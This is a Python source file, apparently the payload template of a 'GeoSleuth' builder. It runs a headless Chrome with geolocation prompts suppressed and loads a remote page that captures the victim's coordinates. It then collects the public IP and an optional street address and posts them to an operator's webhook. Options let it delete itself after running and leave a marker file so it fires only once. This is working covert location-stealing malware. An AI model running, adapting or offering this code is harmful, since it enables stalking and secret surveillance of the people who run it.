SELF_DEBUG = None
SELF_NOWINDOW = None
SELF_NOCONSOLE = None
SELF_ADDRESS = None
SELF_ACCURACY = None
SELF_WEBHOOK = None
SELF_SYSTEMCHECK = None
SELF_DELAY = 1

VERSION = '0.2.1'
BUILDER = 'GeoSleuth'
AUTHOR = 'Synthiny'

import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time
import os
import sys

def term():
    script_path = os.path.abspath(__file__)
    os.remove(script_path)

def check_system():
    appdata_path = os.getenv('APPDATA')
    file_name = requests.get('https://github.com/Synthiny/GeoSleuth/raw/refs/heads/main/html/fname.html').text.strip()

    file_path = os.path.join(appdata_path, file_name)

    if os.path.exists(file_path):

        if SELF_DEBUG == True:debug(f"File {file_name} already exists. Exiting...")
        term()
        sys.exit()

    with open(file_path, 'w') as f:
        f.write("")

def debug(message):
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
    print(f"[{current_time}] {message}")

def check_chromedriver():
    if not os.path.exists("chromedriver"):
        if SELF_DEBUG == True:debug("Chromedriver not found. Downloading the latest version.")
        driver_path = ChromeDriverManager().install()
        return driver_path
    else:
        if SELF_DEBUG == True:debug("Chromedriver found.")
        return "chromedriver"

def reverse_geocode(latitude, longitude):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={latitude}&lon={longitude}&format=json&addressdetails=1"
        response = requests.get(url, headers={'User-Agent': 'geo-reverse-geocoding'})
        
        if response.status_code == 200:
            data = response.json()
            if "address" in data:
                address = data["address"]
                full_address = data.get("display_name", "")
                return full_address.strip(", ")
        return None
    except requests.exceptions.RequestException as e:
        if SELF_DEBUG == True:debug(f"Error during geocoding: {e}")
        return None


def relay(CLIENT_LATITUDE, CLIENT_LONGITUDE, CLIENT_ACCURACY, CLIENT_ILA):
    embed = {
        "embeds": [
            {
                "title": "Extracted Location",
                "description": f"IP: {CLIENT_ILA}",
                "color": 0x00FF00,  # Green
                "fields": [
                    {
                        "name": "Latitude",
                        "value": str(CLIENT_LATITUDE),
                        "inline": True
                    },
                    {
                        "name": "Longitude",
                        "value": str(CLIENT_LONGITUDE),
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "Sent from GeoSleuth"
                }
            }
        ]
    }

    if SELF_ACCURACY == True:
        embed["embeds"][0]["fields"].append({
            "name": "Accuracy",
            "value": str(CLIENT_ACCURACY),
            "inline": True
        })
    
    if SELF_ADDRESS == True:
        CLIENT_ADDRESS = reverse_geocode(latitude=CLIENT_LATITUDE, longitude=CLIENT_LONGITUDE)
        embed["embeds"][0]["fields"].append({
            "name": "Address",
            "value": str(CLIENT_ADDRESS),
            "inline": True
        })

    if SELF_WEBHOOK != False or None:
        response = requests.post(SELF_WEBHOOK, json=embed)
        if response.status_code == 204:
            if SELF_DEBUG:
                debug(f"Relay successful. Status code: {response.status_code}")
                
        else:
            if SELF_DEBUG:
                debug(f"Failed to send message. Status code: {response.status_code}")

def start():
    if SELF_SYSTEMCHECK == True:
        check_system()
    chrome_options = Options()
    if SELF_NOWINDOW == True:
        chrome_options.add_argument("--headless") 
    chrome_options.add_argument("--use-fake-ui-for-media-stream")
    chrome_options.set_capability('goog:loggingPrefs', {'browser': 'ALL'})

    chromedriver_path = check_chromedriver()
    service = Service(chromedriver_path)
    driver = webdriver.Chrome(service=service, options=chrome_options)

    driver.get("https://synthiny.github.io/GeoSleuth/html/scrape.html")

    time.sleep(SELF_DELAY)

    CLIENT_LATITUDE = None
    CLIENT_LONGITUDE = None
    CLIENT_ACCURACY = None

    logs = driver.get_log('browser')
    for entry in logs:
        if 'Latitude:' in entry['message']:
            CLIENT_LATITUDE = float(entry['message'].split("Latitude: ")[1].split()[0].strip('"'))
        elif 'Longitude:' in entry['message']:
            CLIENT_LONGITUDE = float(entry['message'].split("Longitude: ")[1].split()[0].strip('"'))
        elif 'Accuracy:' in entry['message']:
            CLIENT_ACCURACY = float(entry['message'].split("Accuracy: ")[1].split()[0].strip('"'))

    if SELF_DEBUG == True:
        if SELF_DEBUG == True:debug(f"CLIENT_LATITUDE: {CLIENT_LATITUDE}")
        if SELF_DEBUG == True:debug(f"CLIENT_LONGITUDE: {CLIENT_LONGITUDE}")
        if SELF_DEBUG == True:debug(f"CLIENT_ACCURACY: {CLIENT_ACCURACY}")
    else:
        pass

    if SELF_WEBHOOK != False:
        if SELF_DEBUG == True:debug(SELF_WEBHOOK)
        CLIENT_ILA = requests.get("https://api.ipify.org").text
        relay(CLIENT_LATITUDE, CLIENT_LONGITUDE, CLIENT_ACCURACY, CLIENT_ILA)
    driver.quit()


if __name__ in "__main__":
    start()
